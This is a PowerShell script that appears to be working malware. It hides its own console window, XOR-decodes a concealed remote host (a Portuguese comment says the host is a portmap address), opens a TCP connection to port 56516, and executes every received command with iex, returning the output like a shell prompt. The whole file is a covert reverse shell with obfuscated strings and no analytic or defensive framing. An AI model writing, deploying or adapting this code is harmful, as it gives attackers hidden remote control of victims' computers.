$Bf6KZJKt = (-join([char]0x5B, [char]0x44, [char]0x6C, [char]0x6C, [char]0x49, [char]0x6D, [char]0x70, [char]0x6F, [char]0x72, [char]0x74, [char]0x28, [char]0x22, [char]0x75, [char]0x73, [char]0x65, [char]0x72, [char]0x33, [char]0x32, [char]0x2E, [char]0x64, [char]0x6C, [char]0x6C, [char]0x22, [char]0x29, [char]0x5D, [char]0x20, [char]0x70, [char]0x75, [char]0x62, [char]0x6C, [char]0x69, [char]0x63, [char]0x20, [char]0x73, [char]0x74, [char]0x61, [char]0x74, [char]0x69, [char]0x63, [char]0x20, [char]0x65, [char]0x78, [char]0x74, [char]0x65, [char]0x72, [char]0x6E, [char]0x20, [char]0x62, [char]0x6F, [char]0x6F, [char]0x6C, [char]0x20, [char]0x53, [char]0x68, [char]0x6F, [char]0x77, [char]0x57, [char]0x69, [char]0x6E, [char]0x64, [char]0x6F, [char]0x77, [char]0x28, [char]0x69, [char]0x6E, [char]0x74, [char]0x20, [char]0x68, [char]0x61, [char]0x6E, [char]0x64, [char]0x6C, [char]0x65, [char]0x2C, [char]0x20, [char]0x69, [char]0x6E, [char]0x74, [char]0x20, [char]0x73, [char]0x74, [char]0x61, [char]0x74, [char]0x65, [char]0x29, [char]0x3B))
add-type -name win -member $Bf6KZJKt -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)

# Ofuscação de String (XOR) mantida para esconder o host portmap
$host_decrypted = $($k8087='3HTq<%0^M';$b=[byte[]](0x61,0x01,0x17,0x39,0x7D,0x77,0x74,0x6F,0x7C,0x03,0x78,0x02,0x5C,0x09,0x13,0x05,0x6F,0x7B,0x1D,0x38,0x3B,0x03,0x48,0x48,0x51,0x2E,0x63,0x5B,0x27,0x27,0x05);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8087);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))

Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient($host_decrypted, 56516))
Set-Variable -Name stream -Value ($client.GetStream())
[byte[]]$ko6mj1 = 0..65535|%{0}

while((Set-Variable -Name i -Value ($stream.Read($ko6mj1, 0, $ko6mj1.Length))) -ne 0){
    Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($ko6mj1,0, $i))
    Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String )
    Set-Variable -Name sendback2 -Value ($sendback + (-join([char]0x50, [char]0x53, [char]0x20)) + (pwd).Path + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PiA='))))
    Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2))
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()